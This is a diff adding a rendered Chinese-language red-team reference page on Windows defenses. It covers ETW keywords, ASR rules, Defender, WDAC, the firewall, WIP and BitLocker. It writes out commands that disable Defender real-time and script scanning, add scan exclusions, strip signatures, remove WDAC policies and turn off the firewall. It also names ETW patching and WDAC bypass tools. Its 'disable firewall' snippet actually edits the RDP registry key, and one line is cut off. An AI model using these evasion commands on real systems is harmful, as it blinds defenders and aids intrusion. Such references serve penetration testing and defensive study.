+<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="n">0x0000000000000800</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="n">0x0000000000001000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE</span>
+<a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a><span class="n">0x0000000000002000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="n">0x0000000000004000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE</span>
+<a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a><span class="n">0x0000000000008000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a><span class="n">0x0000000000010000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_READVM_LOCAL</span>
+<a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a><span class="n">0x0000000000020000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_READVM_REMOTE</span>
+<a id="__codelineno-27-19" name="__codelineno-27-19" href="#__codelineno-27-19"></a><span class="n">0x0000000000040000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL</span>
+<a id="__codelineno-27-20" name="__codelineno-27-20" href="#__codelineno-27-20"></a><span class="n">0x0000000000080000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE</span>
+<a id="__codelineno-27-21" name="__codelineno-27-21" href="#__codelineno-27-21"></a><span class="n">0x0000000000100000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD</span>
+<a id="__codelineno-27-22" name="__codelineno-27-22" href="#__codelineno-27-22"></a><span class="n">0x0000000000200000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_RESUME_THREAD</span>
+<a id="__codelineno-27-23" name="__codelineno-27-23" href="#__codelineno-27-23"></a><span class="n">0x0000000000400000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS</span>
+<a id="__codelineno-27-24" name="__codelineno-27-24" href="#__codelineno-27-24"></a><span class="n">0x0000000000800000</span>  <span class="n">KERNEL_THREATINT_KEYWORD_RESUME_PROCESS</span>
+</code></pre></div>
+<p>最常用的绕过技术是修补 <code>EtwEventWrite</code> 函数，该函数被调用以写入/记录 ETW 事件。你可以使用 <code>logman query providers -pid &lt;PID&gt;</code> 列出为进程注册的提供程序。</p>
+<h2 id="asr">攻击面减少 (ASR)</h2>
+<blockquote>
+<p>攻击面减少 (ASR) 是指用于减少攻击者可能用来利用系统或网络潜在切入点的策略和技术。</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">Add-MpPreference</span> <span class="n">-AttackSurfaceReductionRules_Ids</span> <span class="p">&lt;</span><span class="n">Id</span><span class="p">&gt;</span> <span class="n">-AttackSurfaceReductionRules_Actions</span> <span class="n">AuditMode</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="nb">Add-MpPreference</span> <span class="n">-AttackSurfaceReductionRules_Ids</span> <span class="p">&lt;</span><span class="n">Id</span><span class="p">&gt;</span> <span class="n">-AttackSurfaceReductionRules_Actions</span> <span class="n">Enabled</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>描述</th>
+<th>ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阻止执行可能混淆的脚本</td>
+<td>5beb7efe-fd9a-4556-801d-275e5ffc04cc</td>
+</tr>
+<tr>
+<td>阻止 JavaScript 或 VBScript 启动下载的可执行内容</td>
+<td>d3e037e1-3eb8-44c8-a917-57927947596d</td>
+</tr>
+<tr>
+<td>阻止滥用已利用的漏洞签名驱动程序</td>
+<td>56a863a9-875e-4185-98a7-b882c64b5ce5</td>
+</tr>
+<tr>
+<td>阻止来自电子邮件客户端和 Web 邮件的可执行内容</td>
+<td>be9ba2d9-53ea-4cdc-84e5-9b1eeee46550</td>
+</tr>
+<tr>
+<td>阻止源自 PSExec 和 WMI 命令的进程创建</td>
+<td>d1e49aac-8f56-4280-b9ba-993a6d77406c</td>
+</tr>
+<tr>
+<td>使用针对勒索软件的高级保护</td>
+<td>c1db55ab-c21a-4637-bb3f-a12568109d35</td>
+</tr>
+<tr>
+<td>阻止从 Windows 本地安全机构子系统 (lsass.exe) 窃取凭据</td>
+<td>9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2</td>
+</tr>
+</tbody>
+</table>
+<h2 id="windows-defender">Windows Defender 防病毒</h2>
+<p>也称为 <code>Microsoft Defender</code>。</p>
+<ul>
+<li>
+<p>检查 Defender 状态</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-MpComputerStatus</span>
+</code></pre></div>
+</li>
+<li>
+<p>禁用扫描所有下载的文件和附件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span><span class="p">;</span> <span class="nb">Get-MpComputerStatus</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-DisableIOAVProtection</span> <span class="nv">$true</span>
+</code></pre></div>
+</li>
+<li>
+<p>禁用 AMSI (设置为 0 以启用)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-DisableScriptScanning</span> <span class="n">1</span> 
+</code></pre></div>
+</li>
+<li>
+<p>从扫描中排除文件夹、进程</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&quot;C:\Temp&quot;</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&quot;C:\Windows\Tasks&quot;</span>
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Set-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="s2">&quot;word.exe&quot;</span><span class="p">,</span> <span class="s2">&quot;vmwp.exe&quot;</span>
+</code></pre></div>
+</li>
+<li>
+<p>使用 WMI 排除文件夹</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">WMIC</span> <span class="p">/</span><span class="n">Namespace</span><span class="p">:\\</span><span class="n">root</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Defender</span> <span class="n">class</span> <span class="n">MSFT_MpPreference</span> <span class="n">call</span> <span class="n">Add</span> <span class="n">ExclusionPath</span><span class="p">=</span><span class="s2">&quot;C:\Users\Public\wmic&quot;</span>
+</code></pre></div>
+</li>
+<li>
+<p>移除特征库。<strong>注意</strong>：如果存在 Internet 连接，它们将会再次被下载。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">&amp;</span> <span class="s2">&quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot;</span> <span class="n">-RemoveDefinitions</span> <span class="n">-All</span>
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">&amp;</span> <span class="s2">&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot;</span> <span class="n">-RemoveDefinitions</span> <span class="n">-All</span>
+</code></pre></div>
+</li>
+</ul>
+<p>识别被 Windows Defender 防病毒软件检测到的具体字节：</p>
+<ul>
+<li><a href="https://github.com/matterpreter/DefenderCheck">matterpreter/DefenderCheck</a> - 识别 Microsoft Defender 标记的字节</li>
+<li><a href="https://github.com/gatariee/gocheck">gatariee/gocheck</a> - 高速版 DefenderCheck</li>
+</ul>
+<h2 id="windows-defender_1">Windows Defender 应用程序控制</h2>
+<p>也称为 <code>WDAC/UMCI/Device Guard</code>。</p>
+<blockquote>
+<p>Windows Defender 应用程序控制，前身称为 Device Guard，有权控制应用程序是否可以在 Windows 设备上执行。WDAC 将防止多余的或恶意的代码、驱动程序和脚本的执行、运行和加载。WDAC 不信任任何它不知道的软件。</p>
+</blockquote>
+<ul>
+<li>
+<p>获取 WDAC 当前模式</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="p">$</span> <span class="nb">Get-ComputerInfo</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="n">DeviceGuardCodeIntegrityPolicyEnforcementStatus</span>         <span class="p">:</span> <span class="n">EnforcementMode</span>
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="n">DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus</span> <span class="p">:</span> <span class="n">EnforcementMode</span>
+</code></pre></div>
+</li>
+<li>
+<p>使用 CiTool.exe 移除 WDAC 策略 (Windows 11 2022 Update)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">CiTool</span><span class="p">.</span><span class="n">exe</span> <span class="n">-rp</span> <span class="s2">&quot;{PolicyId GUID}&quot;</span> <span class="n">-json</span>
+</code></pre></div>
+</li>
+<li>
+<p>Device Guard 策略位置: <code>C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip</code></p>
+</li>
+<li>Device Guard 示例策略: <code>C:\Windows\System32\CodeIntegrity\ExamplePolicies\</code></li>
+<li>WDAC 工具: <a href="https://github.com/mattifestation/WDACTools">mattifestation/WDACTools</a>，一个便于构建、配置、部署和审计 Windows Defender 应用程序控制 (WDAC) 策略的 PowerShell 模块</li>
+<li>WDAC 绕过技术: <a href="https://github.com/bohops/UltimateWDACBypassList">bohops/UltimateWDACBypassList</a><ul>
+<li><a href="https://github.com/nettitude/Aladdin">nettitude/Aladdin</a> - 使用 AddInProcess.exe 绕过 WDAC</li>
+</ul>
+</li>
+</ul>
+<h2 id="windows-defender_2">Windows Defender 防火墙</h2>
+<ul>
+<li>
+<p>列出防火墙状态和当前配置</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">dump</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="c"># 或 </span>
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">state</span>
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">config</span>
+</code></pre></div>
+</li>
+<li>
+<p>列出防火墙阻断的端口</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nv">$f</span><span class="p">=</span><span class="nb">New-object</span> <span class="n">-comObject</span> <span class="n">HNetCfg</span><span class="p">.</span><span class="n">FwPolicy2</span><span class="p">;</span><span class="nv">$f</span><span class="p">.</span><span class="n">rules</span> <span class="p">|</span>  <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">action</span> <span class="o">-eq</span> <span class="s2">&quot;0&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span><span class="n">applicationname</span><span class="p">,</span><span class="n">localports</span>
+</code></pre></div>
+</li>
+<li>
+<p>禁用防火墙</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c"># 通过 cmd 禁用防火墙</span>
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span>  <span class="p">/</span><span class="n">v</span> <span class="n">fDenyTSConnections</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span> <span class="p">/</span><span class="n">f</span>
+<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
+<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="c"># 通过 Powershell 禁用防火墙</span>
+<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-command</span> <span class="s1">&#39;Set-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Terminal Server&quot; -Name &quot;fDenyTSConnections&quot; –Value&#39;</span><span class="p">`</span>
+<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>
+<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="c"># 使用原生命令禁用任何 Windows 防火墙</span>
+<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="nb">set </span><span class="n">opmode</span> <span class="n">disable</span>
+<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="n">netsh</span> <span class="n">Advfirewall</span> <span class="nb">set </span><span class="n">allprofiles</span> <span class="n">state</span> <span class="n">off</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="windows-wip">Windows 信息保护 (WIP)</h2>
+<p>Windows 信息保护 (WIP)，前身称为企业数据保护 (EDP)，是 Windows 10 中的一项安全功能，有助于保护企业设备上的敏感数据。WIP 通过允许管理员定义控制如何访问、共享和保护企业数据的策略，有助于防止意外数据泄露。WIP 通过识别和分离设备上的企业数据与个人数据来工作。</p>
+<p>本地标记为企业的文件的保护是通过 Windows 的加密文件系统 (EFS) 加密（NTFS 文件系统的一项功能）实现的。</p>
+<ul>
+<li>
+<p>枚举文件属性，<code>Encrypted</code> 属性用于受 WIP 保护的文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="p">(</span><span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="s1">&#39;C:\...&#39;</span><span class="p">).</span><span class="n">attributes</span>
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="n">Archive</span><span class="p">,</span> <span class="n">Encrypted</span>
+</code></pre></div>
+</li>
+<li>
+<p>加密文件: <code>cipher /c &lt;加密文件.后缀&gt;</code></p>
+</li>
+<li>解密文件: <code>cipher /d &lt;加密文件.后缀&gt;</code></li>
+</ul>
+<p><strong>企业上下文 (Enterprise Context)</strong> 列显示每个应用程序可以对你的企业数据执行哪些操作：</p>
+<ul>
+<li><strong>Domain</strong>。显示员工的工作域 (例如 corp.contoso.com)。此应用程序被视为与工作相关，可以自由接触并打开工作数据和资源。</li>
+<li><strong>Personal</strong>。显示文本 Personal。此应用程序被视为与工作无关，无法接触任何工作数据或资源。</li>
+<li><strong>Exempt</strong>。显示文本 Exempt。Windows 信息保护策略不适用于这些应用程序 (例如系统组件)。</li>
+</ul>
+<h2 id="bitlocker">BitLocker 驱动器加密</h2>
+<p>BitLocker 是 Microsoft Windows 操作系统中包含的一个全盘加密功能，始于 Windows Vista。它旨在通过为整个卷提供加密来保护数据。BitLocker 使用 AES 加密算法加密磁盘上的数据。启用后，BitLocker 要求用户在加载操作系统之前输入密码或插入 USB 闪存驱动器以解锁加密卷，从而确保磁盘上的数据免受未经授权的访问。BitLocker 通常用于笔记本电脑、便携式存储设备和其他移动设备，以防被盗或丢失时保护敏感数据。</p>
+<p>当 BitLocker 处于 <code>Suspended</code> 状态时，使用 Windows 安装 USB 引导系统，然后使用此命令解密驱动器：<code>manage-bde -off c:</code></p>
+<p>你可以使用此命令检查是否已完成解密：<code>manage-bde -status</code></p>
+<h2 id="_3">参考资料</h2>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide">Attack surface reduction rules reference - Microsoft 365 - November 30, 2023</a></li>
+<li><a href="https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/">Catching Credential Guard Off Guard - Valdemar Carøe - October 23, 2025</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate">Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - Microsoft - December 9, 2022</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context">Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - Microsoft - March 10, 2023</a></li>
+<li><a href="https://www.trustedsec.com/blog/disabling-av-with-process-suspension/">DISABLING AV WITH PROCESS SUSPENSION - Christopher Paschen - March 24, 2023</a></li>
+<li><a href="https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/">Disabling Event Tracing For Windows - UNPROTECT Project - April 19, 2022</a></li>
+<li><a href="https://itm4n.github.io/lsass-runasppl/">Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - April 7, 2021</a></li>
+<li><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101">ETW: Event Tracing for Windows 101 - ired.team - January 6, 2020</a></li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3">PowerShell about_Logging_Windows - Microsoft Documentation - September 30, 2025</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies">Remove Windows Defender Application Control (WDAC) policies - Microsoft - December 9, 2022</a></li>
+<li><a href="https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf">Sneaking Past Device Guard - Cybereason - Philip Tsukerman - December 4, 2022</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="最后更新">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年3月10日 14:43:41 UTC">2026年3月10日</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+  <div class="social-container">
+    <b>Share this content</b>
+    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+      <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+      <a class="a2a_button_x"></a>
+      <a class="a2a_button_telegram"></a>
+      <a class="a2a_button_linkedin"></a>
+      <a class="a2a_button_email"></a>
+      <a class="a2a_button_microsoft_teams"></a>
+    </div>
+    <br>
+    <script async src="https://static.addtoany.com/menu/page.js"></script>
+  </div>
+  <script defer src="https://cloud.umami.is/script.js" data-website-id="49aad71c-7d98-4635-8bd5-b6799c8874f8"></script>
+
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
